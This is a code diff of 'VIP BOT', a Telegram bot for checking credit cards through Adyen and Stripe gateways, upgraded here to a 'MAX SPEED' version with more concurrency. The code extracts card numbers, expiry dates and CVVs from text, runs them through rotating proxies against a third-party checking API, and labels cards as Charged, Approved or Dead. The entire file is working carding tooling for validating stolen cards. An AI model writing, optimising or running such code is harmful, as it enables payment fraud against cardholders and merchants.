@@ -1,5 +1,5 @@
 # ==============================================================================
-# VIP BOT - ADYEN & STRIPE API CHECK ENGINE v3.0
+# VIP BOT - ADYEN & STRIPE API CHECK ENGINE v3.2 (MAX SPEED)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -85,12 +85,16 @@ GOSPEL_API_URL = "https://gates.valyrian.cc/gospel-piano/check"
 
 KEYS_FILE = "redeem_keys.json"
 
-# ====================== TIMEOUT & RETRY CONFIG ======================
-API_TIMEOUT = 15  # OPTIMIZED: 15s instead of 60s (dead cards reject fast)
-API_MAX_RETRIES = 3  # OPTIMIZED: 3 retries instead of 8 (faster fail)
-API_RETRY_DELAY = 2.0  # OPTIMIZED: 2s instead of 7s (faster retry)
+# ====================== TIMEOUT & RETRY CONFIG (MAX SPEED) ======================
+API_TIMEOUT = 12
+API_MAX_RETRIES = 2
+API_RETRY_DELAY = 1.5
+HIT_DELAY = 0.0
 
-HIT_DELAY = 0.0  # OPTIMIZED: No delay for instant hit delivery
+# ⚡ إعدادات السرعة القصوى
+MAX_CONCURRENT_CHECKS = 40
+MASS_WORKERS = 20
+DASHBOARD_UPDATE_INTERVAL = 10
 
 _JOIN_CACHE = {}
 _MAINTENANCE_MODE = False
@@ -143,41 +147,41 @@ def escape_html(text):
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 # ====================== TELEGRAM PREMIUM CUSTOM EMOJIS ======================
-CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">\U0001f451</tg-emoji>'
-CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">\U0001f48e</tg-emoji>'
-CE_MIC = '<tg-emoji emoji-id="5224736245665511429">\U0001f3a4</tg-emoji>'
-CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">\U0001f642</tg-emoji>'
-CE_CHART = '<tg-emoji emoji-id="5246762912428603768">\U0001f4c9</tg-emoji>'
-CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">\U0001f978</tg-emoji>'
-CE_CONTAINER = '<tg-emoji emoji-id="5269531045165816230">\U0001f921</tg-emoji>'
+CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
+CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
+CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
+CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
+CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
+CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
+CE_CONTAINER = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
 CE_CLOWN = CE_CONTAINER
-CE_FLY = '<tg-emoji emoji-id="5231449120635370684">\U0001f4b8</tg-emoji>'
-CE_SHIELD = '<tg-emoji emoji-id="5251203410396458957">\U0001f6e1\ufe0f</tg-emoji>'
-CE_SEARCH = '<tg-emoji emoji-id="5231012545799666522">\U0001f50d</tg-emoji>'
-switch_emoji = '<tg-emoji emoji-id="5325547803936572038">\u2728</tg-emoji>'
+CE_FLY = '<tg-emoji emoji-id="5231449120635370684">💸</tg-emoji>'
+CE_SHIELD = '<tg-emoji emoji-id="5251203410396458957">🛡️</tg-emoji>'
+CE_SEARCH = '<tg-emoji emoji-id="5231012545799666522">🔍</tg-emoji>'
+switch_emoji = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
 CE_SPARKLES = switch_emoji
-CE_GAME = '<tg-emoji emoji-id="5361741454685256344">\U0001f3ae</tg-emoji>'
-CE_MEDAL = '<tg-emoji emoji-id="5440539497383087970">\U0001f947</tg-emoji>'
-CE_CALENDAR = '<tg-emoji emoji-id="5413879192267805083">\U0001f5d3\ufe0f</tg-emoji>'
-CE_CLIP = '<tg-emoji emoji-id="5305265301917549162">\U0001f4ce</tg-emoji>'
-CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">\u231b</tg-emoji>'
-CE_STAR = '<tg-emoji emoji-id="5794073296492303710">\u2b50</tg-emoji>'
-CE_THINK1 = '<tg-emoji emoji-id="5917785839428967062">\U0001f914</tg-emoji>'
-CE_FLASH = '<tg-emoji emoji-id="5445388803223091254">\u26a1\ufe0f</tg-emoji>'
-CE_TEARS = '<tg-emoji emoji-id="6201792892634140208">\U0001f972</tg-emoji>'
-CE_SHY = '<tg-emoji emoji-id="6201647288947839133">\U0001f92d</tg-emoji>'
-CE_CHECK = '<tg-emoji emoji-id="5445189224682779974"><b>\u2714\ufe0f</b></tg-emoji>'
-CE_DOWN = '<tg-emoji emoji-id="5445358884480916784">\U0001f53d</tg-emoji>'
-CE_CARD = '<tg-emoji emoji-id="5447453226498552490">\U0001f4b3</tg-emoji>'
-CE_MAIL = '<tg-emoji emoji-id="5445163772706582819">\U0001f4ec</tg-emoji>'
-CE_MAN = '<tg-emoji emoji-id="5447311106030726740">\U0001f468\u200d\U0001f9b0</tg-emoji>'
-CE_CASH = '<tg-emoji emoji-id="5409048419211682843">\U0001f4b5</tg-emoji>'
-CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">\U0001f389</tg-emoji>'
-CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">\U0001f56f\ufe0f</tg-emoji>'
-CE_TOP = '<tg-emoji emoji-id="5415655814079723871">\U0001f51d</tg-emoji>'
-CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">\u2699\ufe0f</tg-emoji>'
-CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">\u2744\ufe0f</tg-emoji>'
-CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">\U0001f4a5</tg-emoji>'
+CE_GAME = '<tg-emoji emoji-id="5361741454685256344">🎮</tg-emoji>'
+CE_MEDAL = '<tg-emoji emoji-id="5440539497383087970">🥇</tg-emoji>'
+CE_CALENDAR = '<tg-emoji emoji-id="5413879192267805083">🗓️</tg-emoji>'
+CE_CLIP = '<tg-emoji emoji-id="5305265301917549162">📎</tg-emoji>'
+CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji>'
+CE_STAR = '<tg-emoji emoji-id="5794073296492303710">⭐</tg-emoji>'
+CE_THINK1 = '<tg-emoji emoji-id="5917785839428967062">🤔</tg-emoji>'
+CE_FLASH = '<tg-emoji emoji-id="5445388803223091254">⚡️</tg-emoji>'
+CE_TEARS = '<tg-emoji emoji-id="6201792892634140208">🥲</tg-emoji>'
+CE_SHY = '<tg-emoji emoji-id="6201647288947839133">🤭</tg-emoji>'
+CE_CHECK = '<tg-emoji emoji-id="5445189224682779974"><b>✔️</b></tg-emoji>'
+CE_DOWN = '<tg-emoji emoji-id="5445358884480916784">🔽</tg-emoji>'
+CE_CARD = '<tg-emoji emoji-id="5447453226498552490">💳</tg-emoji>'
+CE_MAIL = '<tg-emoji emoji-id="5445163772706582819">📬</tg-emoji>'
+CE_MAN = '<tg-emoji emoji-id="5447311106030726740">👨‍🦰</tg-emoji>'
+CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
+CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
+CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯️</tg-emoji>'
+CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
+CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
+CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
+CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
 
 # ====================== FLAG TRANSLATIONS ======================
 ISO3_TO_ISO2 = {
@@ -271,7 +275,7 @@ COUNTRY_NAME_TO_CODE = {
     "ZAMBIA": "ZM", "ZIMBABWE": "ZW"
 }
 
-def get_flag_emoji(country_code, fallback="\U0001f3f3\ufe0f"):
+def get_flag_emoji(country_code, fallback="🏳️"):
     if not country_code: return fallback
     c = str(country_code).upper().strip()
     if len(c) == 3:
@@ -437,9 +441,25 @@ _USER_HTTP_SESSIONS = {}
 async def get_user_http_session(uid):
     key = f"{uid}_msp"
     if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
-        connector = aiohttp.TCPConnector(limit=50, limit_per_host=30, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=600, use_dns_cache=True, family=0)  # OPTIMIZED: Higher limits + DNS cache
+        connector = aiohttp.TCPConnector(
+            limit=100,
+            limit_per_host=50,
+            ssl=False,
+            enable_cleanup_closed=True,
+            force_close=False,
+            ttl_dns_cache=600,
+            use_dns_cache=True,
+            family=0
+        )
         timeout = aiohttp.ClientTimeout(total=API_TIMEOUT, connect=5)
-        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(connector=connector, timeout=timeout, headers={"Connection": "keep-alive", "Keep-Alive": "timeout=30, max=100"})
+        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(
+            connector=connector,
+            timeout=timeout,
+            headers={
+                "Connection": "keep-alive",
+                "Keep-Alive": "timeout=30, max=100"
+            }
+        )
     return _USER_HTTP_SESSIONS[key]
 
 async def cleanup_user_http_session(uid):
@@ -452,14 +472,14 @@ async def cleanup_user_http_session(uid):
 def extract_cc(text):
     if not text: return []
     cards = []
-    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
+    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\:]+(\d{2})[\s|/\:]+(\d{2,4})[\s|/\:]+(\d{3,4})', text):
         y = '20' + y if len(y) == 2 else y
         cards.append(f"{c}|{m}|{y}|{cv}")
     if not cards:
-        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
+        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\:]+(\d{2})[\s|/\:]+(\d{4})(\d{3,4})', text):
             cards.append(f"{c}|{m}|{y}|{cv}")
     if not cards:
-        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
+        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\:]+(\d{2})[\s|/\:]+(\d{2})(\d{3,4})', text):
             cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
 
@@ -656,7 +676,7 @@ async def get_bin_info(bin_code, session=None):
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "\U0001f310"}
 
 # ==============================================================================
-# ADYEN API ENGINE v3.0 - REAL API CHECK
+# ADYEN API ENGINE v3.2 - MAX SPEED
 # ==============================================================================
 async def check_adyen_api(card, proxy, session):
     proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
@@ -713,11 +733,9 @@ async def check_adyen_api(card, proxy, session):
                 clean_refusal = unsf(refusal_reason).lower().strip() if refusal_reason else ""
                 clean_result = unsf(result_code).lower().strip() if result_code else ""
 
-                # CHARGED - Adyen Authorised
                 if clean_result == "authorised" or any(k in clean_rm for k in ['authorised', 'authorized', 'approved', 'success', 'completed']):
                     return {'status': 'Charged', 'message': rm or 'Authorised', 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # INSUFFICIENT FUNDS
                 insufficient_keywords = [
                     'not enough balance', 'insufficient funds', 'insufficient_funds', 'funds',
                     'low balance', 'not enough', 'limit exceeded', 'over limit', 'exceeds', 'nsf',
@@ -726,7 +744,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_refusal in ['not enough balance'] or any(k in clean_rm for k in insufficient_keywords) or any(k in clean_refusal for k in insufficient_keywords):
                     return {'status': 'Insufficient', 'message': refusal_reason or rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # APPROVED - CVV Match / CVC Declined
                 approved_keywords = [
                     'cvc declined', 'cvv match', 'security code', 'invalid_cvv', 'incorrect_cvv',
                     'match', 'avs', 'address verification', 'cvv2', 'cid', 'cvv correct',
@@ -735,7 +752,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_refusal in ['cvc declined'] or any(k in clean_rm for k in approved_keywords) or any(k in clean_refusal for k in approved_keywords):
                     return {'status': 'Approved', 'message': refusal_reason or rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # DEAD - Refused / Cancelled
                 dead_keywords = [
                     'declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud',
                     'not allowed', 'expired', 'processor_declined', 'card_declined',
@@ -750,7 +766,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_result in ['refused', 'cancelled'] or any(k in clean_rm for k in dead_keywords) or any(k in clean_refusal for k in dead_keywords):
                     return {'status': 'Dead', 'message': refusal_reason or rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # SITE ERROR
                 site_error_keywords = [
                     'error', 'timeout', 'connection', 'unreachable', 'not found',
                     'acquirer error', 'issuer unavailable', 'system error',
@@ -759,7 +774,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_result == "error" or any(k in clean_rm for k in site_error_keywords) or any(k in clean_refusal for k in site_error_keywords):
                     return {'status': 'Site Error', 'message': refusal_reason or rm, 'card': card}
 
-                # Unknown = Dead
                 if len(clean_rm) < 5 or clean_rm in ['ok', 'done', 'yes', 'true']:
                     return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
@@ -786,7 +800,7 @@ async def check_adyen_api(card, proxy, session):
     return {'status': 'Site Error', 'message': last_error or 'Unknown Error', 'card': card}
 
 # ==============================================================================
-# STRIPE $1 API ENGINE v3.0 - REAL API CHECK
+# STRIPE $1 API ENGINE v3.2 - MAX SPEED
 # ==============================================================================
 async def check_stripe_api(card, proxy, session):
     proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
@@ -844,23 +858,19 @@ async def check_stripe_api(card, proxy, session):
                 clean_code = stripe_code if stripe_code else ""
                 clean_decline = stripe_decline if stripe_decline else ""
 
-                # CHARGED - Stripe succeeded
                 if stripe_status == "succeeded" or any(k in clean_rm for k in ['succeeded', 'success', 'charged', 'payment succeeded', 'completed']):
                     return {'status': 'Charged', 'message': rm or 'Payment Succeeded', 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # INSUFFICIENT FUNDS
                 insufficient_codes = ['insufficient_funds', 'insufficient funds', 'balance_insufficient']
                 insufficient_keywords = ['insufficient funds', 'insufficient_funds', 'funds', 'low balance', 'not enough', 'nsf']
                 if clean_code in insufficient_codes or any(k in clean_rm for k in insufficient_keywords) or any(k in clean_decline for k in insufficient_keywords):
                     return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # APPROVED - CVV issues
                 approved_codes = ['incorrect_cvc', 'incorrect_cvv', 'invalid_cvc', 'incorrect_zip', 'incorrect_address']
                 approved_keywords = ['cvc', 'cvv', 'security code', 'incorrect cvc', 'incorrect cvv', 'zip code', 'postal code']
                 if clean_code in approved_codes or any(k in clean_rm for k in approved_keywords):
                     return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # DEAD
                 dead_codes = [
                     'card_declined', 'expired_card', 'incorrect_number', 'invalid_number',
                     'invalid_expiry_month', 'invalid_expiry_year', 'invalid_cvc', 'authentication_required',
@@ -877,13 +887,11 @@ async def check_stripe_api(card, proxy, session):
                 if clean_code in dead_codes or any(k in clean_rm for k in dead_keywords) or any(k in clean_decline for k in dead_keywords):
                     return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # SITE ERROR
                 site_error_codes = ['processing_error', 'issuer_not_available', 'try_again_later', 'api_error']
                 site_error_keywords = ['error', 'timeout', 'connection', 'unreachable', 'not found', 'service unavailable']
                 if clean_code in site_error_codes or any(k in clean_rm for k in site_error_keywords):
                     return {'status': 'Site Error', 'message': rm, 'card': card}
 
-                # Unknown = Dead
                 if len(clean_rm) < 5 or clean_rm in ['ok', 'done', 'yes', 'true']:
                     return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Stripe $1', 'price': price}
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
@@ -910,16 +918,15 @@ async def check_stripe_api(card, proxy, session):
     return {'status': 'Site Error', 'message': last_error or 'Unknown Error', 'card': card}
 
 # ==============================================================================
-# REAL PROXY CHECKER ENGINE v3.1 - OPTIMIZED (Fixed False Dead Detection)
+# REAL PROXY CHECKER ENGINE v3.2 - FIXED (No Card Test)
 # ==============================================================================
 # المشكلة كانت: يفحص البروكسي ببطاقة اختبار والـ API يرفضها فيحذف البروكسي الشغال
-# الحل: نفحص الاتصال فقط عبر ipify مع retry، بدون فحص البطاقة
-async def check_proxy_real(proxy_dict, session, timeout=15):
+# الحل: نفحص الاتصال فقط عبر ipify مع retry
+async def check_proxy_real(proxy_dict, session, timeout=10):
     proxy_url = proxy_dict.get('proxy_url') if isinstance(proxy_dict, dict) else proxy_dict
     if not proxy_url:
         return False, "No proxy URL"
 
-    # Test 1: IP Connectivity with retry (3 attempts)
     for attempt in range(3):
         try:
             test_headers = {"User-Agent": "Mozilla/5.0"}
@@ -932,7 +939,6 @@ async def check_proxy_real(proxy_dict, session, timeout=15):
                     except:
                         return True, "Working (IP check passed)"
                 elif r.status in [403, 407, 429]:
-                    # Proxy auth issues or rate limit - still alive but has issues
                     return True, f"Working but limited ({r.status})"
         except asyncio.TimeoutError:
             if attempt < 2:
@@ -948,7 +954,7 @@ async def check_proxy_real(proxy_dict, session, timeout=15):
     return False, "IP Check Failed after retries"
 
 # ==============================================================================
-# REAL CHECK CARD ENGINE - API ONLY (No Workers, No Sites)
+# REAL CHECK CARD ENGINE - MAX SPEED
 # ==============================================================================
 async def check_card_real(card, proxies, session, gateway_name, uid):
     p_dict = random.choice(proxies) if proxies else None
@@ -1153,7 +1159,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
             await styled_reply(update, t, use_gif=True)
 
-        # REAL /checkpxy COMMAND
         elif cmd == "checkpxy":
             if not await force_join_check(update, context): return
             now = time.time()
@@ -1180,16 +1185,16 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 use_gif=True)
             dead_proxies = []
             working_count = 0
-            connector = aiohttp.TCPConnector(limit=20, ssl=False)
+            connector = aiohttp.TCPConnector(limit=50, ssl=False)
             async with aiohttp.ClientSession(connector=connector) as test_session:
                 async def test_single_proxy(idx, p_dict):
                     nonlocal working_count
-                    is_working, msg = await check_proxy_real(p_dict, test_session, timeout=10)  # OPTIMIZED: 10s timeout
+                    is_working, msg = await check_proxy_real(p_dict, test_session, timeout=10)
                     if not is_working:
                         dead_proxies.append((idx, p_dict, msg))
                     else:
                         working_count += 1
-                semaphore = asyncio.Semaphore(20)  # OPTIMIZED: 20 concurrent proxy checks
+                semaphore = asyncio.Semaphore(20)
                 async def bounded_test(idx, p_dict):
                     async with semaphore:
                         await test_single_proxy(idx, p_dict)
@@ -1449,7 +1454,9 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_FLASH} {sf('API Timeout')}:</b> <code>{sf(str(API_TIMEOUT))}s</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
-# ====================== REAL MASS PROCESSOR - API ONLY (No Workers) ======================
+# ==============================================================================
+# REAL MASS PROCESSOR v3.2 - MAX SPEED (40 Concurrent, 20 Workers)
+# ==============================================================================
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards)
@@ -1464,12 +1471,13 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
         return process_store.get(uid, {}).get("stopped", False)
 
     hit_tasks = []
-    # Semaphore for API-only checking (no workers system)
-    sem = asyncio.Semaphore(25)  # OPTIMIZED: 25 concurrent API calls for high CPM
+    # ⚡⚡⚡ Semaphore: 40 concurrent API calls (was 5)
+    sem = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
 
     async def dashboard_updater():
         while not is_stopped():
-            for _ in range(50):  # OPTIMIZED: 5 seconds instead of 2 (less Telegram API load)
+            # ⚡⚡⚡ Update every 10 seconds (was 2s)
+            for _ in range(DASHBOARD_UPDATE_INTERVAL * 10):
                 if is_stopped(): break
                 await asyncio.sleep(0.1)
             if is_stopped(): break
@@ -1546,8 +1554,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     last_resp = sf(f"Sys Err: {str(e)[:20]}")
                 queue.task_done()
 
-    # Launch workers (OPTIMIZED: 10 workers with 25 semaphore for max CPM)
-    wt = [asyncio.create_task(worker()) for _ in range(10)]
+    # ⚡⚡⚡ Launch 20 workers (was 5)
+    wt = [asyncio.create_task(worker()) for _ in range(MASS_WORKERS)]
     process_store[uid]["tasks"] = wt + [ut]
     await asyncio.gather(*wt, return_exceptions=True)
     if not ut.done():
@@ -1614,7 +1622,7 @@ def main():
     app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
-    logger.info("\u2705 VIP BOT v3.0 IS FULLY OPERATIONAL WITH ADYEN & STRIPE API ENGINE!")
+    logger.info("\u2705 VIP BOT v3.2 MAX SPEED - 40 CONCURRENT / 20 WORKERS / 12s TIMEOUT")
     while True:
         try:
             app.run_polling(drop_pending_updates=True)
